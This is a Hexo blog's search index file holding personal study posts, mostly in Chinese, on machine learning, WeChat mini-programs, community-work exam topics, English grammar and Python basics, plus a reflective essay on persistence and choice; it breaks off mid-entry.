<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/12/05/hello-world/"/>
      <url>/2024/12/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>machineLearning</title>
      <link href="/2021/01/07/machineLearning/"/>
      <url>/2021/01/07/machineLearning/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="吴恩达机器学习课程多遍学习感悟"><a href="#吴恩达机器学习课程多遍学习感悟" class="headerlink" title="吴恩达机器学习课程多遍学习感悟"></a>吴恩达机器学习课程多遍学习感悟</h1><ul><li>之后我每一段我觉得是需要掌握的重点的地方会列三段代码，第一段是第一遍学习后的感悟，第二段是我第二次视频学习后的感悟，第三段暂时决定是学完整个视频后重新审视第一次和第二次学习并总结精炼语句给出解释。</li></ul><hr><h2 id="P1-P5什么是机器学习，监督学习，无监督学习，模型描述"><a href="#P1-P5什么是机器学习，监督学习，无监督学习，模型描述" class="headerlink" title="P1-P5什么是机器学习，监督学习，无监督学习，模型描述"></a>P1-P5什么是机器学习，监督学习，无监督学习，模型描述</h2><hr><h3 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h3><p>学多了才会有更深的感悟，这里没必要多解释，直接进入下一个内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第二遍学习发现自己在这里漏了一个挺重要的内容</span><br><span class="line">Task</span><br><span class="line">Experience</span><br><span class="line">Performance</span><br><span class="line">简写TEP，</span><br><span class="line">T计算机所做的任务不断重复</span><br><span class="line">E计算机得到的经验成果</span><br><span class="line">P评估Ｅ是否是有价值的</span><br></pre></td></tr></table></figure><hr><h3 id="监督学习supervisedlearning"><a href="#监督学习supervisedlearning" class="headerlink" title="监督学习supervisedlearning"></a>监督学习supervisedlearning</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在我看来课程主要讲了监督学习的概念：在确定数据库样本中的分类的情况下，看机器是否能将数据进行分类。</span><br><span class="line">两种监督学习的例子：分类和回归</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">监督学习中我们已经确定了样本的正确性，并能够给样本进行分类了，和无监督学习相比无监督学习更像是监督学习的前置操作。</span><br></pre></td></tr></table></figure><h4 id="分类classification"><a href="#分类classification" class="headerlink" title="分类ｃｌａｓｓｉｆｉｃａｔｉｏｎ"></a>分类ｃｌａｓｓｉｆｉｃａｔｉｏｎ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似与离散函数，只有0,1选项的选择，试用的是小的数据样本，数据样本并不连续，数量也不多</span><br></pre></td></tr></table></figure><h4 id="回归regression"><a href="#回归regression" class="headerlink" title="回归regression"></a>回归regression</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似于连续函数，数据的样本多且相对比较连续，可以拟合出相应的曲线。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多样本中模拟出原样本中不存在的值其实就是高中数学学的线性回归，用原本样本得到拟合曲线，最终在拟合曲线上找到你要的值</span><br></pre></td></tr></table></figure><hr><h3 id="无监督学习unsupervisedlearning"><a href="#无监督学习unsupervisedlearning" class="headerlink" title="无监督学习unsupervisedlearning"></a>无监督学习unsupervisedlearning</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">无监督学习的概念：在不确定数据库样本的分类前提下让计算机自己进行分类，机器可以在数据中选出有相同特征的类/簇。</span><br><span class="line">无监督学的相关算法叫聚类算法。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你大量的数据，机器需要通过数据将数据分类这些类有着相同的结构特征</span><br></pre></td></tr></table></figure><hr><h3 id="模型描述"><a href="#模型描述" class="headerlink" title="模型描述"></a>模型描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">课程用的是简单的一元线性回归说明的模型，</span><br><span class="line">两个变量，两个参数一个方法：</span><br><span class="line">变量一：输入（input，x）feature</span><br><span class="line">变量二：输出（output,y,h(x))target</span><br><span class="line">方法：在我的理解是映射课程中用的是假说/假设（hoyphisi算了拼不出来（&gt;\/&lt;))的条件下</span><br><span class="line">用类似h(x)=a+bx的一次函数拟合数据的例子，其中a,b就是其中的参数，</span><br><span class="line">要得到合适的函数a,b的取值很重要，但是更重要的方法，学会调参在我看来没有选择方法重要，可能工作中调参的情况更多。</span><br><span class="line">这就是一个简单的模型</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x是feature数据的特征</span><br><span class="line">y是我们要达到的target</span><br><span class="line">h是hypothesis</span><br><span class="line">这里其实无监督学习某些时候已经达到目的了，之后不需要监督学习的过程了。纠正之前无监督学习是监督学习的前置过程的理解误区。</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 吴恩达,machineLearning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mini_programs</title>
      <link href="/2020/11/30/mini-programs/"/>
      <url>/2020/11/30/mini-programs/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序入门"><a href="#微信小程序入门" class="headerlink" title="微信小程序入门"></a>微信小程序入门</h1><h1 id="开发者工具熟悉，APPID"><a href="#开发者工具熟悉，APPID" class="headerlink" title="开发者工具熟悉，APPID"></a>开发者工具熟悉，APPID</h1><h1 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h1><h2 id="微信小程序的框架"><a href="#微信小程序的框架" class="headerlink" title="微信小程序的框架"></a>微信小程序的框架</h2><ul><li>MINA 微信小程序的原生框架</li><li>微信小程序提供了自己的视图层语言WXML（标签）和WXSS（样式），以及JavaScript(写逻辑），</li></ul><h1 id="小程序的配置文件"><a href="#小程序的配置文件" class="headerlink" title="小程序的配置文件"></a>小程序的配置文件</h1><h2 id="全局配置文件app-json"><a href="#全局配置文件app-json" class="headerlink" title="全局配置文件app.json"></a>全局配置文件app.json</h2><ol><li>pages 字段————可以描述当前小程序所有的页面路径，这是为了微信客户端知道当前你的小程序页面定义在哪个目录</li><li>windows 字段————定义小程序所有页面的顶部背景颜色，文字颜色等定义<br>写了一部分感觉官方文档写的好仔细应该看文档就可以学会很多吧。<br>接下来专心看视频记录关键就好</li></ol><ul><li>navigationbar 这部分指的是导航栏</li></ul><p>3.tabbar底部导航</p><ul><li>和pages、windows一样的文件层级输入tabbar回车会自动补全所需默认代码，但是如果加上“”就不会自动补全了。</li><li>pagepath表示点击后的连接路径</li><li>text 文字</li><li>iconpath 表示未选中图标路径</li><li>selecticonpath 表示选中图标路径</li><li>list中包含以上这些，一个list代表一个图标一个路径</li></ul><h2 id="页面配置"><a href="#页面配置" class="headerlink" title="页面配置"></a>页面配置</h2><p>具体网页中的json文件用于配置具体文件的，可以配置小程序页面相关内容，也可以单独配置页面的上拉下拉刷新，</p><h2 id="sitemap-配置"><a href="#sitemap-配置" class="headerlink" title="sitemap 配置"></a>sitemap 配置</h2><p>项目中的sitemap.json文件。用于设置微信索引你的小程序。</p><h1 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h1><p>WXML（weixin Makeup Language)框架设计的标签语言</p><h2 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h2>]]></content>
      
      
      
        <tags>
            
            <tag> wechat,miniprogram </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>community</title>
      <link href="/2020/11/27/community/"/>
      <url>/2020/11/27/community/</url>
      
        <content type="html"><![CDATA[<h1 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h1><h2 id="构成要素"><a href="#构成要素" class="headerlink" title="构成要素"></a>构成要素</h2><ul><li>人口要素　第一要素，社区产生存在的前提</li><li>地域要素　根本之处</li><li>物质要素　基础设施</li><li>组织结构要素　正式组织、非正式组织</li><li>心理要素　社区意识，归属感（自豪或羞耻）和认同感（尽责任）</li><li>文化要素　精神财富及物质形态：信仰，价值观、行为规范、历史传统、风俗习惯、生活方式、地方语言、特定象征</li></ul><h3 id="其他的观点"><a href="#其他的观点" class="headerlink" title="其他的观点"></a>其他的观点</h3><ul><li>一定人口</li><li>一定的地域空间</li><li>一定规模的社区设施</li><li>一定社区文化</li><li>一定社区组织</li></ul><h1 id="工会"><a href="#工会" class="headerlink" title="工会"></a>工会</h1><h2 id="工会法"><a href="#工会法" class="headerlink" title="工会法"></a>工会法</h2><h3 id="工会的性质"><a href="#工会的性质" class="headerlink" title="工会的性质"></a>工会的性质</h3><p>中国共产党领导的职工自愿结合的工人阶级群众组织，是党联系职工群众的桥梁和纽带,是国家政权的重要社会支柱，是会员和职工利益的代表。</p><p>工会法第二条有表述工会性质</p><h4 id="三大特征"><a href="#三大特征" class="headerlink" title="三大特征"></a>三大特征</h4><ul><li><p>阶级性 工会会员必须是工人阶级，必须自愿加入，必须保护工人阶级的利益</p></li><li><p>群众性 在阶级中具有广泛性，代表会员和职工群众的利益，内部工作的民主性,自愿性</p></li><li><p>政治性 工会组织的灵魂，是第一位的。党的领导。</p></li><li><p>阶级性、群众性、政治性的统一<br>工会组织以阶级性为限度，以群众性为基础，以政治性为方向</p></li></ul><h4 id="工会常识"><a href="#工会常识" class="headerlink" title="工会常识"></a>工会常识</h4><p>第一步工会法1950年6月颁布</p><p>工会职能：维护、建设、参与、教育<br>两个普遍：两个依法，依法建立，依法推动集体协商</p><h3 id="工会的基本职责"><a href="#工会的基本职责" class="headerlink" title="工会的基本职责"></a>工会的基本职责</h3><h3 id="工会的组织类型"><a href="#工会的组织类型" class="headerlink" title="工会的组织类型"></a>工会的组织类型</h3><h3 id="工会组织的建立和撤销"><a href="#工会组织的建立和撤销" class="headerlink" title="工会组织的建立和撤销"></a>工会组织的建立和撤销</h3><h2 id="工会章程"><a href="#工会章程" class="headerlink" title="工会章程"></a>工会章程</h2><h1 id="马哲"><a href="#马哲" class="headerlink" title="马哲"></a>马哲</h1><p> 马克思的两大发现：唯物史观、剩余价值学说<br> 鲜明特征：科学性、革命性、实践性、人民性、发展性</p><p> 观念决定行动，行动体现观念。<br> 世界观决定方法论，方法论体现世界观。<br> 哲学是理论化系统化的世界观和方法论的统一<br> 哲学和具体科学：具体科学是哲学的基础</p><h1 id="社会政策法规"><a href="#社会政策法规" class="headerlink" title="社会政策法规"></a>社会政策法规</h1><h2 id="未成年人"><a href="#未成年人" class="headerlink" title="未成年人"></a>未成年人</h2><ul><li>权益</li></ul><p>生存权、发展权、受保护权、参与权、受教育权</p><ul><li><p>保护方式</p></li><li><p>不良行为、犯罪矫正</p></li><li><p>孤儿、流浪儿安置</p></li></ul><h2 id="老年人"><a href="#老年人" class="headerlink" title="老年人"></a>老年人</h2><h2 id="妇女"><a href="#妇女" class="headerlink" title="妇女"></a>妇女</h2><h2 id="残疾人"><a href="#残疾人" class="headerlink" title="残疾人"></a>残疾人</h2>]]></content>
      
      
      
        <tags>
            
            <tag> conmunity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>english</title>
      <link href="/2020/11/27/english/"/>
      <url>/2020/11/27/english/</url>
      
        <content type="html"><![CDATA[<h1 id="grammar"><a href="#grammar" class="headerlink" title="grammar"></a>grammar</h1><h2 id="part-of-speech-functional"><a href="#part-of-speech-functional" class="headerlink" title="part of speech&#x2F;functional"></a>part of speech&#x2F;functional</h2><p>1.preposition(介词）<br>2.article(冠词）<br>3.noun（名词）<br>4.pronoun（代词）<br>5.numeral(数词）<br>6.adverb（副词）<br>7.adjective(形容词)<br>8.verb(动词）<br>9.conjunction(连词）<br>10.interjection（感叹词）</p><h1 id="spoken-language-colloquialism"><a href="#spoken-language-colloquialism" class="headerlink" title="spoken language - - colloquialism"></a>spoken language - - colloquialism</h1><h2 id="shanxi-or-shaanxi-山西or-陕西）"><a href="#shanxi-or-shaanxi-山西or-陕西）" class="headerlink" title="shanxi or shaanxi(山西or 陕西）"></a>shanxi or shaanxi(山西or 陕西）</h2><p>I‘m from Shaanxi.You can visit the TerraCotta Warriors there.<br>The food in Shannxi is great.</p><h2 id="I’m-not-gonna-let-you-get-away-with-this"><a href="#I’m-not-gonna-let-you-get-away-with-this" class="headerlink" title="I’m not gonna let you get away with this!"></a>I’m not gonna let you get away with this!</h2><p>get away with something 逍遥法外，逃脱 meaning not have to shoulder responsibility for the deeds that somebody has done</p>]]></content>
      
      
      
        <tags>
            
            <tag> grammar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>experience</title>
      <link href="/2020/11/26/experience/"/>
      <url>/2020/11/26/experience/</url>
      
        <content type="html"><![CDATA[<h1 id="人生的经验"><a href="#人生的经验" class="headerlink" title="人生的经验"></a>人生的经验</h1><h2 id="坚持篇"><a href="#坚持篇" class="headerlink" title="坚持篇"></a>坚持篇</h2><p>计算机通过选择和循环结构可以创造世界，选择是一个人的眼光，循环就是一个人的坚持。</p><p>三天打鱼两天晒网，你将得到的很少。日复一日，年复一年，才能取得成功，成功就是这么不容易。为什么？因为人人都想成功，你的竞争是无穷大的，永远不要以为你自己已经站在了金字塔的顶端，当你自满的往下看时，已经有人超过了你。</p><p>我不奢求能做到第一，但是我希望能把手头的事做到最好，我对自己严格要求，希望自己每天都能看到进步，这是坚持，但是如果这样的坚持让你无法长期坚持这样的坚持是失败的。</p><p>经常听说一万小时定律，一万小时你可以精通一项技能，这也是一种坚持。因为要达到一万小时是什么概念？如果你每天花费3小时学习和熟练这项技能你需要花费九年多的时间。差不多十年，人生能有几个十年，也就是如果你一天只花费3小时学习，一辈子7-10个顶尖技能，大部分人能坚持终身吗？老了还需要这些吗？所以要把最关键的技能花费在最初的20年里，也就是两个技能。现在我觉得应该是学习的能力和与人相处的能力。在学校里，你只用学习和掌握如何与周围的人相处合作。之后的十年你需要的是什么？20-30岁，大概是你吃饭的技能提升吧。</p><p>有人很好奇我为什么不把剩下的21小时算进去，因为人们总有太多的琐事，能挤出3小时学习已经很不错了。等计算机能完全代替重复的劳动时，也许你能获得更多的时间，而现在你只需要每天3小时，不够时空余时间把它补齐。</p><p>坚持从来不是一件容易的事，有人和我讨论这个世界上有没有天才时我的回答总是没有，当他们问我为什么时，我只会告诉他们，你觉得天才为什么能被称之为天才，因为他们能在某些方面做的很好，因为他们可能天生在这方面领悟能力很高，但是有的人领悟能力很低，却通过自己的努力做的和领悟力很高的人一样好，甚至更出色，这时你称更努力的人为天才，这不是在侮辱他们为此付出的努力吗？</p><p>人本就不是可以轻易成功的，就算你已经做得很好，仍可能失败。但是你的努力你的汗水，你所经历的时间，所积累的实力不会欺骗你,你仍然因为你的努力走在大部分原地踏步的人之前，你因为你坚持下来了。</p><p>我所承认的天才是努力型的天才，只有努力坚持下去了，才能看起来毫不费力解决你面对的问题。坚持是0到无穷的过程，当你不断坚持你终有一天会停下来，变成一个很接近你的目标的值。就算达不到你也可以骄傲的说我坚持下来了。</p><h2 id="选择篇"><a href="#选择篇" class="headerlink" title="选择篇"></a>选择篇</h2><p>选择是一个我一直不知道怎么写的话题，但是今天我开始有了方向。</p><p>其实很简单，我很迷茫，不知道选择做什么。这时候你只要随便选一个去做就好。我有目标，希望完成某件事，这时候坚持做下去就好了。选择就是0和1，做或者不做，所有的利弊分析都会拖慢这个进程，人生的进程中大部分时间在循环，而选择决定的是一条需要不断循环的路，这条路的顺畅程度决定于你的选择。这时候你不妨在人生前段多走走多看看，只要不跌下悬崖，不选择一条注定的不归路，都可以大胆的往前走，当你觉得达到了某个条件或者目的就果断的退出。多尝试之后你会确定一些东西，路的大概长度，路是否有尽头，路是不是你想走一辈子的。这些路不一定是你都走过的，也许是你听来的经验，但是这都没问题，因为你知道只有你能决定自己的选择，如果你不愿意循环能进行下去多久，帮你决定的人能陪你多久，选择好之后必然是孤独的单循环。</p><p>37%，人生在这个结点必须有自己的抉择，古人三十而立，公务员考试告诉你35岁是终点，你给自己的37%划在了那里？27？虽不是越早越好，也该停下了。</p><p>现在我对选择依旧很迷茫没滚西，总有一天会好的，慢慢来吧。不要忘记每次选择好后拼命的循环，找到你的循环终止条件就是选择的分叉口。</p><p>我的选择？当前学习目标通过编程简化我的繁琐工作，分析出我需要确认并主动做出选择的时，将工作中的繁琐循环都交由计算机完成。</p><p>工作如此，学习目标也需要分解，语言我现在学了20多年的语言还没有掌握好一门断断续续让我学了又忘，渐渐连母语都开始不熟悉，我究竟做了什么。断了，没有很好的循环，每次都从零开始，这样是不行的。必须一个个来，一个个循环，单词循环？语法循环？也许这两个熟练后我能获得所有，这两个循环的过程必须要说出口。不是一味的追求量，而是熟练度。</p><p>工作技能计算机是最主要的，是未来。是我认定的最需要努力的方向，日后的自动化一切都会用到它，熟练掌握这个才是基础。语言：python，解决问题：目前是excel的自动化，微信小程序的设计。其他涉及深入都可以以后慢慢学。</p><p>公务员考试，只是为了换取一份轻松而繁琐的工作，你能将掌握的知识解决繁琐的问题，剩下的时间可以用来轻松的学习其他的而没有任何负担。工作不过是21小时内一项必要的杂务罢了，但是还要好好面对。一天大概抽出1小时看看题吧。</p><p>爱：芋圆难道不好吗？</p><p>还有什么选择？以后慢慢来吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> experience,persistence,choice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python1.md</title>
      <link href="/2020/11/24/python1-md/"/>
      <url>/2020/11/24/python1-md/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="课程来源：AI大学Python基础入门"><a href="#课程来源：AI大学Python基础入门" class="headerlink" title="课程来源：AI大学Python基础入门"></a>课程来源：<a href="aidaxue.com/course/courseDetail?id=394">AI大学Python基础入门</a></h2><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><h2 id="创建元组"><a href="#创建元组" class="headerlink" title="创建元组"></a>创建元组</h2><p>tuple1 &#x3D; () ＃小括号创建一个新的元组</p><p>tuple1 &#x3D; (‘abc’,1,4,4,56,7,[1,2,’asdf’],(1,2))</p><p>#注意创建一个元素的元组时必须加逗号</p><p>tuple2 &#x3D; (1,)</p><p>list1 &#x3D; [1,2,3,4,5]</p><p>tuple(list1) #进行强制类型转换</p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><p>len(tuple1)</p><p>tuple1[3] #索引查找元素<br>tuple1[-2] #可以通过索引寻找元素，但是没法通过索引对元素进行修改</p><p>tuple1[1:3] #切片<br>tuple1[5:3:-1] #倒切片</p><p>tuple1+tuple2  #连接两个元组</p><p>tuple1*3 #复制</p><p>tuple2[0] &#x3D; 1<br>del tuple[0]  #元组元素不能修改和删除</p><p>del tuple1 #可以删除元组</p><p>max(tuple1)<br>min(tuple1) #取最大最小值</p><p>tuple1.count(6) #对元组内元素进行计数</p><h2 id="学习问题"><a href="#学习问题" class="headerlink" title="学习问题"></a>学习问题</h2><p>感觉这套课程缺乏使用实例，比如元组有啥用，怎么用，可能后面会介绍，可能一直不会介绍。不过我百度找到了</p><h2 id="元组的用途"><a href="#元组的用途" class="headerlink" title="元组的用途"></a>元组的用途</h2><p>元组比列表的操作速度快<br>如果定义的数据是常量可以使用元组<br>元组不可变，可以作为字典的键(key)</p><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合的定义"><a href="#集合的定义" class="headerlink" title="集合的定义"></a>集合的定义</h2><p>集合是无序的，所以无索引，<br>集合元素是不重复的，可以使用集合对列表进行去重操作</p><h2 id="集合基本操作"><a href="#集合基本操作" class="headerlink" title="集合基本操作"></a>集合基本操作</h2><p>set1 &#x3D; {} #空集合</p><p>set2 &#x3D; set([1,2,3,4])</p><p>type(set1)</p><p>set1.add(60) #集合中加元素</p><p>set2.update(set1) #将set1加入至set2中</p><p>set1.remove(6) #将6从集合中删除</p><h2 id="集合的运算"><a href="#集合的运算" class="headerlink" title="集合的运算"></a>集合的运算</h2><p>set1-set2 #集合的差集</p><p>set1 | set2 #集合的并集</p><p>set1 &amp; set2 #集合的交集</p><p>set1 ^ set2 #返回只被set1包含或者只被set2 包含的元素集合</p><p>set1 &gt; set2 #如果set1真包含set2,返回true,否则返回false</p><h2 id="集合的常用操作"><a href="#集合的常用操作" class="headerlink" title="集合的常用操作"></a>集合的常用操作</h2><p>list(set([1,1,1,2,2,4,5,6])) #列表去重</p><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>突然想到芋圆好像是爱吃四季豆，爱吃辣，对于海鲜好像也比较喜欢，感觉好像对肉类都可以接受(最近不爱吃鱼）</p><h2 id="基本用途"><a href="#基本用途" class="headerlink" title="基本用途"></a>基本用途</h2><p>字典表示的是一一对应的关系，由key键value值,键值之间用“：”分隔，不同的键值对之间用逗号分隔，字典用大括号括起来，字典无序用键取数据</p><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>dict1 &#x3D; {} #空字典</p><p>dict2 &#x3D; {‘age1’ : 18,’age2’ : 19}</p><p>dict1 &#x3D; dict([(‘age3’,23),(‘age4’,45)]) #可以用dict()创建字典，放入列表套元组。</p><p>dict2 &#x3D; dict(([‘age6’,23],[‘age7’,24]))#通过元组套列表创建字典</p><p>dict1[‘age3’]#访问键对应值如果查找的值不在字典里会报错</p><p>print(dict1,keys())#返回所有的键的列表</p><p>print(dict,values())#返回所有的值的列表</p><p>dict1.items()#返回包含所有键值的列表</p><p>del dict1[‘age1’]#删除键值对</p><p>print（dict1）</p><p>del dict1</p><p>dict1.clear() #删除字典中所有元素的，将字典变成空字典</p><p>dict1.update(dict2) #将字典dict2中的键值对添加到dict1中</p><p>for key in dict1.keys():#遍历字典只需要遍历它的键<br>    print(key,dict1[key])</p><h2 id="实际例子"><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h2><ul><li>有一列人名，有一列电话号码的excel表格，如何建立字典</li></ul><p>name &#x3D; [‘name1’,’name2’,’name3’,’name4’,’name5’]<br>phone_number &#x3D; [‘phone_number1’,’phone_number2’,’phone_number3’,’phone_number4’,’phone_number5’]<br>zip1 &#x3D; zip(name,phone_number)#zip函数将索引值一一对应组成元组<br>dict_phone &#x3D; dict(list(zip1))</p><p>dict2 &#x3D; dict1<br>dict1[‘age1’] &#x3D; x<br>print(dict2[‘age1’])#会发现虽然赋值虽然发生在前面，但是改变字典1，字典2也会发生改变，print的结果是x</p><p>list2&#x3D; list1<br>list1[0] &#x3D; 0<br>print(list2[0])#和字典1一样<br>id(list1)#id()函数用于获取对象的内存地址</p><ul><li>数据结构的赋值操作直接将内存地址对应</li><li>解决方法：</li></ul><p>import copy #深拷贝可以用引入copy模块实现<br>list1&#x3D;[1,2]<br>list2 &#x3D; list1<br>list2 &#x3D; copy.deepcopy(list1)#这样直接赋值内容，list2和list1的地址不会一样</p><ul><li>芋圆很不喜欢吃面食，以后做饭注意点</li></ul><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><ul><li>顺序</li><li>分支</li><li>循环</li></ul><p>主要注意for经常与range()函数一起使用，range()函数是序列生成函数<br>range(起始值,终止值,步长)</p><h1 id="数据读写"><a href="#数据读写" class="headerlink" title="数据读写"></a>数据读写</h1><h2 id="Python的原生读写"><a href="#Python的原生读写" class="headerlink" title="Python的原生读写"></a>Python的原生读写</h2><p>f &#x3D; open(file,mode&#x3D;”r”,encoding&#x3D;None)#file是文件路径，mode是文件打开模式，常用的应该还有encoding编码格式</p><h3 id="mode的常用参数"><a href="#mode的常用参数" class="headerlink" title="mode的常用参数"></a>mode的常用参数</h3><p>“r” 只读，默认值<br>“w” 可以以写的方式打开文件，会覆盖原文件<br>“x” 创建一个新文件打开并写入操作，如果这个文件已经存在，则会报错<br>“a” 以写的方式打开文件，当执行写入操作时，将会写入的内容追加在原文件之后</p><h3 id="文件打开后的基本操作"><a href="#文件打开后的基本操作" class="headerlink" title="文件打开后的基本操作"></a>文件打开后的基本操作</h3><p>f.read() #读取整个文件，字符串显示<br>f.readline() #一次读一行，指针在当次读取的末尾位置，直至文件的末尾。<br>f.readlines() #读取整个文件，以列表显示<br>strip() #用于移除字符串头尾指定的字符，默认为空格或者换行符，该方法只能删除开头或是结尾的字符，不能删除中间的字符。<br>f.seek(0,0)#第一个参数是偏移量，第二个参数是0表示文件开始处，这是默认值，1表示当前位置，2表示文件结尾</p><h3 id="读取txt文件"><a href="#读取txt文件" class="headerlink" title="读取txt文件"></a>读取txt文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=open(&quot;path&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;)#打开文件</span><br><span class="line">data=[]</span><br><span class="line">for line in f.readlines():</span><br><span class="line">line=line.strip().split(&#x27;\t&#x27;)#去掉头尾的换行空格，并切除&#x27;\t&#x27;</span><br><span class="line">print(line)</span><br><span class="line">data.append(line)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>join()#这个函数用于链接两个字符串</p><p>a1 &#x3D; [‘a1’,’1’]<br>print(‘\t’.join(a1))</p><p>输出结果为a1　1 </p><h2 id="pandas读写数据"><a href="#pandas读写数据" class="headerlink" title="pandas读写数据"></a>pandas读写数据</h2><h3 id="pandas读取txt文件"><a href="#pandas读取txt文件" class="headerlink" title="pandas读取txt文件"></a>pandas读取txt文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">data=pd.read_table(&quot;path&quot;,sep=&#x27;\t&#x27;,header=None,encoding=&#x27;utf-8&#x27;,names=[&#x27;col1&#x27;,&#x27;col2&#x27;])</span><br><span class="line">#header:表头，默认不为空（以第一行作为表头，），取None,无表头</span><br><span class="line">#sep：分隔符</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>今天芋圆说我我的名字太大众了，然后我想古代人会不会取两个字的名字，如果是两个字重名的概率会不会太大了。但是历史上不少人的名字都是两个字的比如刘备，曹操，孙权。这样两个字的名字也太普遍了。但是我忽略了一点名字为两个字的且能被我们记住的多是有名的人。古人除了名字还有字，比如关云长，张翼德，曹孟德，刘玄德，孙仲谋。还有避讳的事，只许州官放火不许百姓点灯的故事，说明以前的人如果是有名的人取名三个字也就要避讳两个字，称呼一般也不直呼其名。我如果在古代会在弱冠之年给自己取什么字呢？</li><li>李明&#x3D;李日月&#x3D;李00&#x3D;李灵麟，芋圆&#x3D;愈圆&#x3D;0，由零结缘，零也是一种无穷。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 